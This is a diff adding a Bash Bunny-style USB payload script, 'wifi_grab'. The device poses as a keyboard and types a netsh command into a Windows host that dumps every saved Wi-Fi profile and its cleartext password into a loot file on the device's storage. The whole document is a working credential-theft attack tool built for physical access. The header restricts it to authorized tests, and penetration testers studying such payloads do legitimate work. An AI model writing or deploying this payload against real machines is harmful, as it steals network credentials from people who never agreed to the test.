@@ -1,0 +1,25 @@
+#!/bin/bash
+# wifi_grab (Windows host, HID+STORAGE) - dump saved Wi-Fi profile names and
+# their cleartext PSKs (netsh key=clear) into loot/wifi.txt.
+# Avatar: Hak5 Bash Bunny "WiFi Grabber" / "NetGrab". Authorized tests only.
+LED SETUP
+ATTACKMODE HID STORAGE
+sleep 3
+mkdir -p /root/udisk/loot
+LED STAGE1
+if [ ! -c /dev/hidg0 ]; then
+    echo "[!] /dev/hidg0 missing - no host attached"
+    LED R SINGLE; sleep 1; LED OFF; LED FINISH; exit 1
+fi
+QUACK "REM wifi_grab" \
+    "DEFAULT_DELAY 40" \
+    "GUI r" "DELAY 400" \
+    "STRING cmd /c (for /f \"tokens=6,*\" %a in ('netsh wlan show profiles ^| findstr \":\"') do @echo %b^>^>E:\\loot\\wifi.txt & netsh wlan show profile name=\"%b\" key=clear ^>^>E:\\loot\\wifi.txt)" "ENTER" \
+    "DELAY 9000"
+if [ -s /root/udisk/loot/wifi.txt ]; then
+    echo "[+] wifi profiles + PSKs -> loot/wifi.txt"
+else
+    echo "[!] nothing captured (not an MS Windows host, or E:\ is not the drive)"
+fi
+LED FINISH
+exit 0
